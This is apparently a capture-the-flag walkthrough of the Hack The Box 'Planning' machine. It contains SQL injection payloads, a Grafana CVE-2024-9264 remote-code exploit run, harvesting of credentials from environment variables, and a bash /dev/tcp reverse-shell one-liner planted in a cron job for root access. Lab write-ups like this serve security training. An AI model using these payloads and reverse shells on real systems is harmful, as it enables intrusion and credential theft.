# HTB Planning Walkthrough

## Host File Setup

# Display the current /etc/hosts file to ensure DNS resolution for planning.htb works properly
cat /etc/hosts

# Manually verify or append the following entry if not present:
# 10.129.34.41    planning.htb
Directory Enumeration with Gobuster
bash
Copy
Edit
# Perform a basic directory scan using a medium-sized custom wordlist
gobuster dir -u http://planning.htb -w medium.txt

# Conduct an extended scan that includes common file extensions (.php, .txt, .html)
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Notable results discovered during enumeration:
# /index.php            (Main index page)
# /contact.php          (Contact form or page)
# /about.php            (About us or similar)
# /detail.php           (Possibly individual course or item details)
# /course.php           (Course-related listing)
# /enroll.php           (Enrollment form or functionality)
Subdomain Enumeration with wfuzz
bash
Copy
Edit
# Navigate to the DNS wordlist directory from SecLists
cd SecLists-master/Discovery/DNS

# Copy the Bitquark subdomain list locally for easier reuse
cp bitquark-subdomains-top100000.txt subdomains.txt

# Use wfuzz to fuzz for subdomains by injecting into the Host header
wfuzz -c -w subdomains.txt -u 'http://planning.htb/' -H "Host: FUZZ.planning.htb" --hw 12

# After discovering a valid subdomain (e.g., grafana.planning.htb), add it to your hosts file:
echo "10.129.34.41 grafana.planning.htb" | sudo tee -a /etc/hosts
SQL Injection Testing with sqlmap
bash
Copy
Edit
# Capture the POST request using Burp Suite and save it to a file (e.g., request.txt)
# The request targets /search with a keyword parameter

# Use sqlmap to test the request with elevated level and risk
sqlmap -r request.txt --batch --level=5 --risk=3 --random-agent

# Sqlmap will try:
# - Boolean-based blind SQLi
# - Error-based SQLi
# - Time-based blind SQLi
# - UNION-based SQLi
# - Stacked queries

# Output: No injectable parameters were found. The keyword parameter appears static.
Manual SQLi Payload Testing
bash
Copy
Edit
# Manual payloads tested via Burp Repeater or browser input:

# Boolean-based tautologies:
' OR '1'='1
' OR 1=1 --
" OR 1=1 --
admin' --

# Error-based payloads:
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y) --
' AND 1=CONVERT(int, (SELECT @@version)) --

# Time-based payloads:
' OR IF(1=1, SLEEP(5), 0) --
' OR 1=1 AND SLEEP(3) --

# UNION-based payloads:
' UNION SELECT NULL, NULL --
' UNION SELECT 1, @@version --

# Edge-case payloads:
') OR ('1'='1
admin') -- 
') AND 1=2 -- 
' OR 1 GROUP BY CONCAT(username, password) -- 
" OR 1=1 LIMIT 1 OFFSET 1 --

# Header injection attempts:
Host: planning.htb
Host: ' OR 1=1 --

# Conclusion: None of the tested injections yielded a positive result. The parameter was confirmed non-vulnerable.
Exploiting Grafana via CVE-2024-9264
bash
Copy
Edit
# Download the exploit code archive from GitHub
wget https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/archive/refs/heads/main.zip -O rce.zip

# Unzip the archive to access the PoC script
unzip rce.zip
cd CVE-2024-9264-RCE-Exploit-main

# Run the exploit using admin credentials obtained previously
python3 poc.py --url http://grafana.planning.htb \
               --username admin \
               --password 0D5oT70Fq13EvB5r \
               --reverse-ip 10.10.14.19 \
               --reverse-port 4444

# Set up a netcat listener to catch the reverse shell
nc -lvnp 4444
Post Exploitation Enumeration (Container)
bash
Copy
Edit
# Confirm access to containerized reverse shell
whoami
# Output: root

# Enumerate environment variables for potential secrets
env

# Inspect container startup script for configuration paths and secrets
cat run.sh

# Extracted credentials from environment:
# GF_SECURITY_ADMIN_USER=enzo
# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!

# Attempt SSH to the host machine using discovered credentials
ssh enzo@10.129.34.41
Host Access and Enumeration
bash
Copy
Edit
# Validate user access after successful SSH login
whoami
# Output: enzo

# Retrieve user flag
cat ~/user.txt

# Begin privilege escalation enumeration using LinPEAS
wget http://10.10.14.19:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Network and Service Enumeration
bash
Copy
Edit
# List all listening TCP and UDP ports with associated processes
ss -tulnp

# Identify services bound to interesting ports (Grafana on 3000, potential dev site on 8000)
lsof -i :3000
lsof -i :8000

# Validate SSH tunnel connections or manually forwarded ports
ps aux | grep 23357
Port Forwarding Custom Proxy (8000 to 5555)
python
Copy
Edit
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data:
            break
        destination.sendall(data)

listen = socket.socket()
listen.bind(("0.0.0.0", 5555))
listen.listen(5)

while True:
    client_sock, _ = listen.accept()
    server_sock = socket.socket()
    server_sock.connect(("127.0.0.1", 8000))

    threading.Thread(target=forward, args=(client_sock, server_sock)).start()
    threading.Thread(target=forward, args=(server_sock, client_sock)).start()
bash
Copy
Edit
# Access the cron web interface via proxy:
firefox http://planning.htb:5555

# Login with:
# Username: root
# Password: P4ssw0rdS0pRi0T3c
Triggering Reverse Shell via Cron Job Interface
bash
Copy
Edit
# Insert a one-liner reverse shell payload into the cron job
/bin/bash -i >& /dev/tcp/10.10.14.99/4444 0>&1

# Set up a listener to catch the shell
nc -lvnp 4444

# You should now have root shell on the host
whoami
# Output: root
